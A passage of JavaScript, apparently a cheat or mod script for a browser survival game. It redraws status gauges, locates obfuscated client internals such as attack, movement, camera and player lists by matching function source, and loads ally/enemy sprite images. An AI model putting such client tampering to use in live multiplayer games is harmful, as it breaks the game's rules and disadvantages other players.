    if (user.chest.open || user.furnace.open && user.inv.find_item(INV.WOOD) != -1 || user.windmill.open && user.inv.find_item(INV.WILD_WHEAT) != -1 || user.extractor.open && user.inv.find_item(INV.WOOD) != -1 || user.well.open && user.inv.find_item(INV.BUCKET_FULL) != -1 || user.bread_oven.open && (user.inv.find_item(INV.WOOD) != -1 || user.inv.find_item(INV.FLOUR) != -1)) {
      t -= scale * 50;
    }
    ctx.translate(innerWidth / 2 - this.img.width / 2, t);
    ctx.fillStyle = "#69A148";
    ctx.fillRect(this.translate.x + scale * 37, this.translate.y + scale * 17, user.gauges.life.x * 178 * scale, scale * 18);
    ctx.globalAlpha = 1;
    if (user.gauges.hunger.x < 0.35) {
      ctx.fillStyle = "#8F050A";
      ctx.globalAlpha = user.gauges.warn_hunger.v;
      ctx.fillRect(this.translate.x + scale * 277, this.translate.y + scale * 17, scale * 178, scale * 18);
      ctx.globalAlpha = 1;
    }
    ctx.fillStyle = "#AF352A";
    ctx.fillRect(this.translate.x + scale * 277, this.translate.y + scale * 17, user.gauges.hunger.x * 178 * scale, scale * 18);
    cold_gauge_right_edge = this.translate.x + scale * 517 + scale * 178;
    cold_bar_width = user.gauges.cold.x * 178 * scale + 1;
    if (user.gauges.cold.x < 0.35) {
      ctx.fillStyle = "#366B91";
      ctx.globalAlpha = user.gauges.warn_cold.v;
      ctx.fillRect(this.translate.x + scale * 517, this.translate.y + scale * 17, scale * 178, scale * 18);
      ctx.globalAlpha = 1;
    }
    ctx.fillStyle = "#669BB1";
    ctx.fillRect(cold_gauge_right_edge - cold_bar_width, this.translate.y + scale * 17, cold_bar_width, scale * 18);
    if (user.gauges.cold.x > 0.99) {
      if (user.gauges.warm.x < 0.35) {
        ctx.fillStyle = "#6C4036";
        ctx.globalAlpha = user.gauges.warn_warm.v;
        ctx.fillRect(this.translate.x + scale * 517, this.translate.y + scale * 17, scale * 178, scale * 18);
        ctx.globalAlpha = 1;
      }
      ctx.fillStyle = "#9C4036";
      ctx.fillRect(cold_gauge_right_edge - (1 - user.gauges.warm.x) * 178 * scale, this.translate.y + scale * 17, (1 - user.gauges.warm.x) * 178 * scale, scale * 18);
    }
    thirst_gauge_right_edge = this.translate.x + scale * 757 + scale * 178;
    thirst_bar_width = user.gauges.thirst.x * 178 * scale + 1;
    if (user.gauges.thirst.x < 0.35) {
      ctx.fillStyle = "#001A57";
      ctx.globalAlpha = user.gauges.warn_thirst.v;
      ctx.fillRect(this.translate.x + scale * 757, this.translate.y + scale * 17, scale * 178, scale * 18);
      ctx.globalAlpha = 1;
    }
    ctx.fillStyle = "#074A87";
    ctx.fillRect(thirst_gauge_right_edge - thirst_bar_width, this.translate.y + scale * 17, thirst_bar_width, scale * 18);
    scale = e;
    ctxDrawImage(ctx, this.img, this.translate.x, this.translate.y);
    this.y = this.translate.y + t;
    ctx.restore();
    if (user.gauges.oxygen.x < 0.99) {
      var _0x35faf7 = Math.floor(canw2 - mySprite[MY_SPRITE.OXYGEN].width / 2);
      t += this.translate.y - mySprite[MY_SPRITE.OXYGEN].height - scale * 5;
      ctx.fillStyle = "#BBE8EF";
      const xTemp = user.gauges.oxygen.x * 588;
      const offset = (588 - xTemp) / 2;
      ctx.fillRect(_0x35faf7 + 5 + offset, t + scale * 5, scale * 588 * user.gauges.oxygen.x, scale * 10);
      if (user.gauges.oxygen.x < 0.35) {
        ctx.fillStyle = "#9BA8AF";
        ctx.globalAlpha = user.gauges.warn_oxygen.v;
        ctx.fillRect(_0x35faf7 + 5, t + 5, scale * 588, scale * 10);
        ctx.globalAlpha = 1;
      }
      ctxDrawImage(ctx, mySprite[MY_SPRITE.OXYGEN], _0x35faf7, t);
      this.y = t;
    }
  }
  function extractGameVariables() {
    user.in_team = function (id) {
      for (let i = 0; i < this.team.length; i++) {
        if (this.team[i] == id) {
          return true;
        }
      }
      return false;
    };
    const clientSocketKey = Object.keys(client)[0];
    Object.defineProperty(client, "socket", {
      get: function () {
        return this[clientSocketKey];
      }
    });
    updateObjectProperties(client, [{
      key: "select_inv",
      apply: obj => {
        return typeof obj === "function" && obj.toString().includes("switch") && obj.toString().includes(".stringify");
      }
    }, {
      key: "select_craft",
      apply: obj => {
        return typeof obj === "function" && obj.toString().includes(".length") && obj.toString().includes(".max") && obj.toString().includes(".stringify");
      }
    }, {
      key: "send_chat",
      apply: obj => {
        return typeof obj === "function" && obj.toString().includes(".substring") && obj.toString().includes(".stringify");
      }
    }, {
      key: "send_attack",
      apply: _param_669 => {
        return typeof _param_669 === "function" && _param_669.toString().replace(/\s+/g, "").includes("Math.PI") && _param_669.toString().replace(/\s+/g, "").includes(")]));}");
      }
    }, {
      key: "last_cam",
      apply: obj => {
        return typeof obj === "object" && obj && Object.keys(obj).length === 2 && Object.values(obj).filter(o => {
          return typeof o === "number";
        }).length === 2;
      }
    }, {
      key: "chat",
      apply: obj => {
        return typeof obj === "function" && obj.length === 1 && obj.toString().replace(/\s+/g, "").includes("Math.random()") && obj.toString().replace(/\s+/g, "").includes(".mode");
      }
    }, {
      key: "gauges_life",
      apply: _param_670 => {
        return typeof _param_670 === "function" && _param_670.length === 2 && countOccurrences(_param_670.toString().replace(/\s+/g, ""), "=") === 2;
      }
    }, {
      key: "leaderboard",
      apply: obj => {
        return typeof obj === "function" && obj.length === 1 && obj.toString().replace(/\s+/g, "").match(/function\([^(){}=;.\s]+\)\{this\.[^(){}=;.\s]+=[^(){}=;.\s]+;var[^(){}=;.\s]+=?newUint16Array\([^(){}=;.\s]+\);\s*[^(){}=;.\s]+\.[^(){}=;.\s]+\.[^(){}=;.\s]+\([^(){}=;.\s]+\);\}/);
      }
    }, {
      key: "try_ping",
      apply: _param_671 => {
        return typeof _param_671 === "function" && _param_671.length === 0 && _param_671.toString().replace(/\s+/g, "").includes("this.ping()");
      }
    }, {
      key: "gather",
      apply: obj => {
        return typeof obj === "function" && obj.length === 1 && countOccurrences(obj.toString().replace(/\s+/g, ""), ".length") === 3 && obj.toString().includes(".id") && countOccurrences(obj.toString().replace(/\s+/g, ""), ".push(") === 1;
      }
    }, {
      key: "lost",
      apply: value => {
        return typeof value === "function" && value.length === 0 && value.toString().includes("reconnect.enabled") && value.toString().includes("return");
      }
    }, {
      key: "update_cam",
      apply: _param_672 => {
        return typeof _param_672 === "function" && _param_672.length === 0 && _param_672.toString().replace(/\s+/g, "").includes("Math.floor(") && _param_672.toString().replace(/\s+/g, "").includes(".stringify(") && _param_672.toString().replace(/\s+/g, "").includes(".x");
      }
    }, {
      key: "initWebSocketConnection",
      apply: value => {
        return typeof value === "function" && value.length === 1 && value.toString().includes("new") && value.toString().includes("JSON.parse");
      }
    }, {
      key: "units",
      apply: value => {
        return typeof value === "function" && value.length === 3 && value.toString().includes("Uint16Array");
      }
    }]);
    {
      {
        const findedKeys = Object.keys(client).filter(_param_673 => {
          return typeof client[_param_673] === "function" && client[_param_673].length === 1 && countOccurrences(client[_param_673].toString().replace(/\s+/g, ""), ";") === 2 && countOccurrences(client[_param_673].toString().replace(/\s+/g, ""), "=") === 1;
        });
        const targetKey = findedKeys[1];
        if (targetKey) {
          Object.defineProperty(client, "craft_ok", {
            get() {
              return this[targetKey];
            },
            set(value) {
              this[targetKey] = value;
            }
          });
        } else {
          console.log("Cannot extract client.craft_ok key");
        }
      }
    }
    updateObjectProperties(user, [{
      key: "inv",
      apply: _param_674 => {
        return typeof _param_674 === "object" && _param_674 !== null && "max" in _param_674 && _param_674.max == 10;
      }
    }, {
      key: "uid",
      apply: (obj, index) => {
        return typeof obj === "number" && obj !== undefined && obj === 0 && Object.keys(user).slice(0, index).some(_param_675 => {
          return _param_675 === "id";
        });
      }
    }, {
      key: "cam",
      apply: _param_676 => {
        return typeof _param_676 === "object" && _param_676 !== null && "rx" in _param_676 && "ry" in _param_676 && "w" in _param_676 && "x" in _param_676 && "y" in _param_676;
      }
    }, {
      key: "gauges",
      apply: _param_677 => {
        return typeof _param_677 === "object" && _param_677 !== null && "c" in _param_677;
      }
    }, {
      key: "alive",
      apply: obj => {
        return typeof obj === "boolean";
      }
    }, {
      key: "ghost",
      apply: obj => {
        return typeof obj === "object" && obj !== null && "enabled" in obj && "label" in obj && "now" in obj;
      }
    }, {
      key: "craft",
      apply: _param_678 => {
        return typeof _param_678 === "object" && _param_678 !== null && "id" in _param_678 && "label" in _param_678 && "mode" in _param_678 && "timeout" in _param_678;
      }
    }, {
      key: "auto_feed",
      apply: obj => {
        return typeof obj === "object" && obj && "enabled" in obj && "translate" in obj && Object.values(obj).filter(_param_679 => {
          return typeof _param_679 === "function";
        }).length > 1;
      }
    }, {
      key: "chat",
      apply: obj => {
        return typeof obj === "object" && obj && obj.input === document.getElementById("chat_input");
      }
    }, {
      key: "terminal",
      apply: obj => {
        return typeof obj === "object" && obj && obj.input === document.getElementById("commandInput");
      }
    }, {
      key: "team",
      apply: obj => {
        return Array.isArray(obj) && obj.length === 0;
      }
    }, {
      key: "resurrection",
      apply: _param_680 => {
        return typeof _param_680 === "object" && _param_680 && "open" in _param_680 && !("time" in _param_680);
      }
    }, {
      key: "well",
      apply: (value, idx) => {
        return typeof value === "object" && value && "open" in value && !("time" in value) && Object.values(user).slice(0, idx).filter(value => {
          return typeof value === "object" && value && "open" in value && !("time" in value);
        }).length === 1;
      }
    }, {
      key: "windmill",
      apply: (_param_681, _param_682) => {
        return typeof _param_681 === "object" && _param_681 && "open" in _param_681 && !("time" in _param_681) && Object.values(user).slice(0, _param_682).filter(_param_683 => {
          return typeof _param_683 === "object" && _param_683 && "open" in _param_683 && !("time" in _param_683);
        }).length === 2;
      }
    }, {
      key: "extractor",
      apply: (_param_684, _param_685) => {
        return typeof _param_684 === "object" && _param_684 && "open" in _param_684 && !("time" in _param_684) && Object.values(user).slice(0, _param_685).filter(_param_686 => {
          return typeof _param_686 === "object" && _param_686 && "open" in _param_686 && !("time" in _param_686);
        }).length === 3;
      }
    }, {
      key: "bread_oven",
      apply: (value, idx) => {
        return typeof value === "object" && value && "open" in value && !("time" in value) && Object.values(user).slice(0, idx).filter(_param_687 => {
          return typeof _param_687 === "object" && _param_687 && "open" in _param_687 && !("time" in _param_687);
        }).length === 4;
      }
    }, {
      key: "sign",
      apply: (_param_688, _param_689) => {
        return typeof _param_688 === "object" && _param_688 && "open" in _param_688 && !("time" in _param_688) && Object.values(user).slice(0, _param_689).filter(value => {
          return typeof value === "object" && value && "open" in value && !("time" in value);
        }).length === 5;
      }
    }, {
      key: "furnace",
      apply: (value, idx) => {
        return typeof value === "object" && value && "open" in value && !("time" in value) && Object.values(user).slice(0, idx).filter(_param_690 => {
          return typeof _param_690 === "object" && _param_690 && "open" in _param_690 && !("time" in _param_690);
        }).length === 6;
      }
    }, {
      key: "chest",
      apply: (value, idx) => {
        return typeof value === "object" && value && "open" in value && !("time" in value) && Object.values(user).slice(0, idx).filter(value => {
          return typeof value === "object" && value && "open" in value && !("time" in value);
        }).length === 7;
      }
    }, {
      key: "desert",
      apply: (value, idx) => {
        return typeof value === "object" && value && "add" in value && Object.values(user).slice(0, idx).filter(_param_691 => {
          return typeof _param_691 === "object" && _param_691 && "add" in _param_691;
        }).length === 1;
      }
    }, {
      key: "winter",
      apply: (_param_692, _param_693) => {
        return typeof _param_692 === "object" && _param_692 && "add" in _param_692 && Object.values(user).slice(0, _param_693).filter(_param_694 => {
          return typeof _param_694 === "object" && _param_694 && "add" in _param_694;
        }).length === 2;
      }
    }, {
      key: "bigmap",
      apply: (_param_695, _param_696) => {
        return typeof _param_695 === "boolean" && Object.values(user).slice(0, _param_696).findIndex(_param_697 => {
          return typeof _param_697 === "object" && _param_697 === user.gauges;
        }) <= _param_696 - 1 && Object.values(user).slice(0, _param_696).findIndex(x => {
          return typeof x === "object" && x === user.gauges;
        }) >= _param_696 - 5;
      }
    }, {
      key: "control",
      apply: _param_698 => {
        return typeof _param_698 === "object" && _param_698 && "angle" in _param_698 && "timeout" in _param_698 && "attack" in _param_698;
      }
    }]);
    updateObjectProperties(user.inv, [{
      key: "n",
      apply: obj => {
        return Array.isArray(obj);
      }
    }, {
      key: "can_select",
      apply: (_param_699, _param_700) => {
        return Array.isArray(_param_699) && Object.values(user.inv).slice(0, _param_700).some(_param_701 => {
          return Array.isArray(_param_701);
        });
      }
    }, {
      key: "find_item",
      apply: _param_702 => {
        return typeof _param_702 === "function" && _param_702.length === 1 && !_param_702.toString().includes("true") && _param_702.toString().includes(".id");
      }
    }]);
    updateObjectProperties(user.terminal, [{
      key: "write_command",
      apply: _param_703 => {
        return typeof _param_703 === "function" && _param_703.length === 4;
      }
    }, {
      key: "commands",
      apply: _param_704 => {
        return typeof _param_704 === "function" && _param_704.length === 1 && _param_704.toString().includes("switch");
      }
    }]);
    updateObjectProperties(user.craft, [{
      key: "crafting",
      apply: _param_705 => {
        return typeof _param_705 === "boolean";
      }
    }]);
    updateObjectProperties(user.gauges, [{
      key: "update",
      apply: _param_706 => {
        return typeof _param_706 === "function" && _param_706.length === 0;
      }
    }]);
    {
      const can_craftKey = Object.keys(user.craft).find(key => {
        return Array.isArray(user.craft[key]) && key !== "label";
      });
      if (can_craftKey) {
        Object.defineProperty(user.craft, "can_craft", {
          get() {
            return this[can_craftKey];
          }
        });
      } else {
        console.log("Cannot extract user.craft.can_craft");
      }
    }
    {
      const keys = Object.keys(user);
      const filteredKeys = keys.filter(_param_707 => {
        return typeof user[_param_707] === "object" && user[_param_707] && "wait" in user[_param_707];
      });
      const totemKey = filteredKeys[0];
      const helmetKey = filteredKeys[1];
      const buildKey = filteredKeys[2];
      const weaponKey = filteredKeys[3];
      Object.defineProperties(user, {
        totem: {
          get() {
            return this[totemKey];
          }
        },
        helmet: {
          get() {
            return this[helmetKey];
          }
        },
        build: {
          get() {
            return this[buildKey];
          }
        },
        weapon: {
          get() {
            return this[weaponKey];
          },
          set(value) {
            return this[weaponKey] = value;
          }
        }
      });
    }
    updateObjectProperties(world, [{
      key: "units",
      apply: _param_708 => {
        return Array.isArray(_param_708) && _param_708.length === 107;
      }
    }, {
      key: "MAX_DIST",
      apply: _param_709 => {
        return typeof _param_709 === "number" && _param_709 && _param_709 === -1000000;
      }
    }, {
      key: "dist_from_biomes",
      apply: _param_710 => {
        return typeof _param_710 === "function" && _param_710.length === 1 && _param_710.toString().replace(/\s+/g, "").includes("r.y;") && _param_710.toString().replace(/\s+/g, "").includes("r.y;");
      }
    }, {
      key: "delete_units",
      apply: _param_711 => {
        return typeof _param_711 === "function" && _param_711.length === 1 && countOccurrences(_param_711.toString().replace(/\s+/g, ""), ".splice(") === 1 && !_param_711.toString().includes("Math");
      }
    }]);
    const worldPlayersKey = Object.keys(world).filter(key => {
      return Array.isArray(world[key]) && world[key].length === 0;
    })[0];
    Object.defineProperty(world, "players", {
      get: function () {
        return world[worldPlayersKey];
      }
    });
    {
      const key = Object.keys(world).filter(_param_712 => {
        return Array.isArray(world[_param_712]) && world[_param_712].length === 0;
      })[1];
      Object.defineProperty(world, "fast_units", {
        get() {
          return this[key];
        }
      });
    }
    updateObjectProperties(game, [{
      key: "gauges",
      apply: obj => {
        return typeof obj === "object" && obj !== null && "translate" in obj && "y" in obj;
      }
    }, {
      key: "chest_buttons",
      apply: obj => {
        return Array.isArray(obj) && obj.length >= 358 && obj.length < 500;
      }
    }, {
      key: "update_connection",
      apply: obj => {
        return typeof obj === "function" && obj.length === 0 && countOccurrences(obj.toString().replace(/\s+/g, ""), "();") === 4 && countOccurrences(obj.toString().replace(/\s+/g, ""), ".") === 4;
      }
    }, {
      key: "update_scene",
      apply: obj => {
        return typeof obj === "function" && obj.length === 0 && obj.toString().replace(/\s+/g, "").includes(".reconnect.enabled&&");
      }
    }, {
      key: "draw_ui",
      apply: _param_713 => {
        return typeof _param_713 === "function" && _param_713.length === 0 && _param_713.toString().replace(/\s+/g, "").includes(".mode");
      }
    }, {
      key: "safe_delete",
      apply: value => {
        return typeof value === "object" && value !== undefined && "open" in value && value?.id?.id === "sure_delete";
      }
    }, {
      key: "trigger_mouseup",
      apply: value => {
        return typeof value === "function" && value.length === 1 && value.toString().includes("enabled");
      }
    }, {
      key: "minimap",
      apply: value => {
        return typeof value === "object" && value !== undefined && "translate" in value && Object.values(value).some(_param_714 => {
          return Array.isArray(_param_714);
        });
      }
    }, {
      key: "trigger_mousedown",
      apply: value => {
        return typeof value === "function" && value.length === 1 && value.toString().includes("focus");
      }
    }]);
    updateObjectProperties(game.safe_delete, [{
      key: "one",
      apply: value => {
        return typeof value === "function" && value.length === 0 && value.name !== "all" && value.toString().includes("enabled") && countOccurrences(value.toString(), "&&") === 2;
      }
    }]);
    if (game.gauges) {
      updateObjectProperties(game.gauges, [{
        key: "img",
        apply: _param_715 => {
          return typeof _param_715 === "object" && _param_715 !== undefined && _param_715 instanceof HTMLCanvasElement;
        }
      }]);
    }
    updateObjectProperties(ui, [{
      key: "getTokenForJoinGame",
      apply: _param_716 => {
        return typeof _param_716 === "function" && _param_716.length === 2 && _param_716.toString().includes("callback");
      }
    }]);
    updateObjectProperties(keyboard, [{
      key: "is_left",
      apply: (_param_717, _param_718) => {
        return typeof _param_717 === "function" && _param_717.length === 0 && countOccurrences(_param_717.toString(), "keys") === 2 && _param_717.toString().includes("||") && Object.values(keyboard).slice(0, _param_718).filter(value1 => {
          return typeof value1 === "function" && value1.length === 0 && countOccurrences(value1.toString(), "keys") === 2 && value1.toString().includes("||");
        }).length === 0;
      }
    }, {
      key: "is_right",
      apply: (value, idx) => {
        return typeof value === "function" && value.length === 0 && countOccurrences(value.toString(), "keys") === 2 && value.toString().includes("||") && Object.values(keyboard).slice(0, idx).filter(value1 => {
          return typeof value1 === "function" && value1.length === 0 && countOccurrences(value1.toString(), "keys") === 2 && value1.toString().includes("||");
        }).length === 1;
      }
    }, {
      key: "is_top",
      apply: (_param_719, _param_720) => {
        return typeof _param_719 === "function" && _param_719.length === 0 && countOccurrences(_param_719.toString(), "keys") === 2 && _param_719.toString().includes("||") && Object.values(keyboard).slice(0, _param_720).filter(value1 => {
          return typeof value1 === "function" && value1.length === 0 && countOccurrences(value1.toString(), "keys") === 2 && value1.toString().includes("||");
        }).length === 2;
      }
    }, {
      key: "is_bottom",
      apply: (_param_721, _param_722) => {
        return typeof _param_721 === "function" && _param_721.length === 0 && countOccurrences(_param_721.toString(), "keys") === 2 && _param_721.toString().includes("||") && Object.values(keyboard).slice(0, _param_722).filter(_param_723 => {
          return typeof _param_723 === "function" && _param_723.length === 0 && countOccurrences(_param_723.toString(), "keys") === 2 && _param_723.toString().includes("||");
        }).length === 3;
      }
    }]);
    updateObjectProperties(mouse, [{
      key: "pos",
      apply: (value, idx) => {
        return typeof value === "object" && "x" in value && "y" in value;
      }
    }]);
    const userConstrolMouseKey = Object.keys(user.control)[3];
    Object.defineProperty(user.control, "mouse", {
      get() {
        return this[userConstrolMouseKey];
      },
      set(value) {
        this[userConstrolMouseKey] = value;
      }
    });
    const userConstrolPreviousKey = Object.keys(user.control)[2];
    Object.defineProperty(user.control, "previous", {
      get() {
        return this[userConstrolPreviousKey];
      },
      set(value) {
        this[userConstrolPreviousKey] = value;
      }
    });
    if (user.gauges) {
      const user_gauges_prop = Object.keys(user.gauges);
      Object.defineProperties(user.gauges, {
        l: {
          get() {
            return this[user_gauges_prop[1]];
          }
        },
        h: {
          get() {
            return this[user_gauges_prop[2]];
          }
        },
        t: {
          get() {
            return this[user_gauges_prop[3]];
          }
        },
        o: {
          get() {
            return this[user_gauges_prop[4]];
          }
        },
        wa: {
          get() {
            return this[user_gauges_prop[5]];
          }
        }
      });
      if (!user.gauges.warn_cold && !user.gauges.warn_life && !user.gauges.warn_hunger && !user.gauges.warn_thirst && !user.gauges.warn_oxygen && !user.gauges.warn_warm) {
        user.gauges.warn_cold = new Utils.LinearAnimation(true, 0, 1, 0, 3, 3);
        user.gauges.warn_life = new Utils.LinearAnimation(true, 0, 1, 0, 2, 2);
        user.gauges.warn_hunger = new Utils.LinearAnimation(true, 0, 1, 0, 3, 3);
        user.gauges.warn_thirst = new Utils.LinearAnimation(true, 0, 1, 0, 3, 3);
        user.gauges.warn_oxygen = new Utils.LinearAnimation(true, 0, 1, 0, 3, 3);
        user.gauges.warn_warm = new Utils.LinearAnimation(true, 0, 1, 0, 3, 3);
      }
      user.gauges.cold = user.gauges[user_gauges_prop[12]];
      user.gauges.life = user.gauges[user_gauges_prop[13]];
      user.gauges.hunger = user.gauges[user_gauges_prop[14]];
      user.gauges.thirst = user.gauges[user_gauges_prop[15]];
      user.gauges.oxygen = user.gauges[user_gauges_prop[16]];
      user.gauges.warm = user.gauges[user_gauges_prop[17]];
    }
    if (user.cam) {
      const keys = Object.keys(user.cam);
      const indexOf_wKey = keys.indexOf("w");
      const hKey = keys[indexOf_wKey + 1];
      const rwKey = keys[indexOf_wKey + 2];
      const rhKey = keys[indexOf_wKey + 3];
      Object.defineProperty(user.cam, "h", {
        get() {
          return this[hKey];
        },
        set(value) {
          this[hKey] = value;
        }
      });
      Object.defineProperty(user.cam, "rw", {
        get() {
          return this[rwKey];
        },
        set(value) {
          this[rwKey] = value;
        }
      });
      Object.defineProperty(user.cam, "rh", {
        get() {
          return this[rhKey];
        },
        set(value) {
          this[rhKey] = value;
        }
      });
    }
    {
      let isOk = false;
      for (const key in client) {
        if (isOk) {
          client.get_focus = client[key];
          break;
        }
        const value = client[key];
        if (typeof value === "function" && value.toString().includes(".level") && value.toString().includes(".label")) {
          client.new_player = client[key];
          isOk = true;
        }
      }
      if (!isOk) {
        console.log("Faile to extract client.get_focus & client.new_player");
      }
    }
    {
      let temp;
      for (const key in client) {
        if (client.send_attack === client[key]) {
          client.stop_attack = temp;
          break;
        }
        temp = client[key];
      }
      if (!client.stop_attack) {
        console.log("Failed to extract client.stop_attack");
      }
    }
    {
      const values = Object.values(client);
      const index = values.indexOf(client.send_attack);
      client.send_angle = values[index + 1];
      client.send_move = values[index + 2];
    }
    if (client.last_cam) {
      Object.defineProperty(client.last_cam, "i", {
        get() {
          return Object.values(this)[0];
        },
        set(value) {
          this[Object.keys(this)[0]] = value;
        }
      });
      Object.defineProperty(client.last_cam, "j", {
        get() {
          return Object.values(this)[1];
        },
        set(value) {
          this[Object.keys(this)[1]] = value;
        }
      });
    }
    {
      const keys = Object.keys(client);
      const index = Object.values(client).indexOf(client.last_cam);
      if (index) {
        Object.defineProperty(client, "cam_delay", {
          get() {
            return client[keys[index - 1]];
          },
          set(value) {
            client[keys[index - 1]] = value;
          }
        });
      }
    }
    {
      const keys = Object.keys(client);
      for (let i = 0; i < keys.length; i++) {
        if (client[keys[i]] === client.select_inv) {
          let findedTargetKey = keys[i + 3];
          Object.defineProperty(client, "recycle_inv", {
            get() {
              return this[findedTargetKey];
            },
            set(value) {
              this[findedTargetKey] = value;
            }
          });
          break;
        }
      }
    }
    {
      const user_craft_preview = Object.keys(user.craft)[4];
      Object.defineProperty(user.craft, "preview", {
        get() {
          return this[user_craft_preview];
        },
        set(value) {
          if (typeof value === "number") {
            this[user_craft_preview] = value;
          } else {
            console.error("Giá trị phải là kiểu number");
          }
        }
      });
    }
    {
      const spriteKey = Object.keys(window).find(key => {
        return !!Array.isArray(window[key]) && !"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ_0123456789".includes(key[0]) && window[key] && window[key].length > 800 && window[key].length < 2000;
      });
      sprite = window[spriteKey];
      if (sprite) {
        let ReiditeSpikeAlly = new Image();
        let AmethystSpikeAlly = new Image();
        let DiamondSpikeAlly = new Image();
        let GoldSpikeAlly = new Image();
        let StoneSpikeAlly = new Image();
        let WoodSpikeAlly = new Image();
        let ReiditeDoorSpikeAlly = new Image();
        let AmethystDoorSpikeAlly = new Image();
        let DiamondDoorSpikeAlly = new Image();
        let GoldDoorSpikeAlly = new Image();
        let StoneDoorSpikeAlly = new Image();
        let WoodDoorSpikeAlly = new Image();
        let ReiditeDoorAlly = new Image();
        let AmethystDoorAlly = new Image();
        let DiamondDoorAlly = new Image();
        let GoldDoorAlly = new Image();
        let StoneDoorAlly = new Image();
        let WoodDoorAlly = new Image();
        let ReiditeSpikeEnemy = new Image();
        let AmethystSpikeEnemy = new Image();
        let DiamondSpikeEnemy = new Image();
        let GoldSpikeEnemy = new Image();
        let StoneSpikeEnemy = new Image();
        let WoodSpikeEnemy = new Image();
        let ReiditeDoorSpikeEnemy = new Image();
        let AmethystDoorSpikeEnemy = new Image();
        let DiamondDoorSpikeEnemy = new Image();
        let GoldDoorSpikeEnemy = new Image();
        let StoneDoorSpikeEnemy = new Image();
        let WoodDoorSpikeEnemy = new Image();
        let ReiditeDoorEnemy = new Image();
        let AmethystDoorEnemy = new Image();
        let DiamondDoorEnemy = new Image();
        let GoldDoorEnemy = new Image();
        let StoneDoorEnemy = new Image();
        let WoodDoorEnemy = new Image();
        ReiditeSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-reidite-spike-ally.png";
        AmethystSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-amethyst-spike-ally.png";
        DiamondSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-diamond-spike-ally.png";
        GoldSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-gold-spike-ally.png";
        StoneSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-stone-spike-ally.png";
        WoodSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-wood-spike-ally.png";
        ReiditeDoorSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-reidite-spike-door-ally.png";
        AmethystDoorSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-amethyst-spike-door-ally.png";
        DiamondDoorSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-diamond-spike-door-ally.png";
        GoldDoorSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-gold-spike-door-ally.png";
        StoneDoorSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-stone-spike-door-ally.png";
        WoodDoorSpikeAlly.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-wood-spike-door-ally.png";
        ReiditeDoorAlly.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_reidite2.png";
        AmethystDoorAlly.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_amethyst1.png";
        DiamondDoorAlly.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_diamond2.png";
        GoldDoorAlly.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_gold2.png";
        StoneDoorAlly.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_stone1.png";
        WoodDoorAlly.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_wood2.png";
        ReiditeSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-reidite-spike-enemy.png";
        AmethystSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-amethyst-spike-enemy.png";
        DiamondSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-diamond-spike-enemy.png";
        GoldSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-gold-spike-enemy.png";
        StoneSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-stone-spike-enemy.png";
        WoodSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-wood-spike-enemy.png";
        ReiditeDoorSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-reidite-spike-door-enemy.png";
        AmethystDoorSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-amethyst-spike-door-enemy.png";
        DiamondDoorSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-diamond-spike-door-enemy.png";
        GoldDoorSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-gold-spike-door-enemy.png";
        StoneDoorSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-stone-spike-door-enemy.png";
        WoodDoorSpikeEnemy.src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-wood-spike-door-enemy.png";
        ReiditeDoorEnemy.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_reidite1.png";
        AmethystDoorEnemy.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_amethyst2.png";
        DiamondDoorEnemy.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_diamond1.png";
        GoldDoorEnemy.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_gold1.png";
        StoneDoorEnemy.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_stone2.png";
        WoodDoorEnemy.src = "https://raw.githubusercontent.com/XmreLoux/images/main/door_wood1.png";
        sprite[10000] = [WoodSpikeAlly, WoodSpikeAlly];
        sprite[10001] = [WoodSpikeEnemy, WoodSpikeEnemy];
        sprite[10002] = [StoneSpikeAlly, StoneSpikeAlly];
        sprite[10003] = [StoneSpikeEnemy, StoneSpikeEnemy];
        sprite[10004] = [GoldSpikeAlly, GoldSpikeAlly];
        sprite[10005] = [GoldSpikeEnemy, GoldSpikeEnemy];
        sprite[10006] = [DiamondSpikeAlly, DiamondSpikeAlly];
        sprite[10007] = [DiamondSpikeEnemy, DiamondSpikeEnemy];
        sprite[10008] = [AmethystSpikeAlly, AmethystSpikeAlly];
        sprite[10009] = [AmethystSpikeEnemy, AmethystSpikeEnemy];
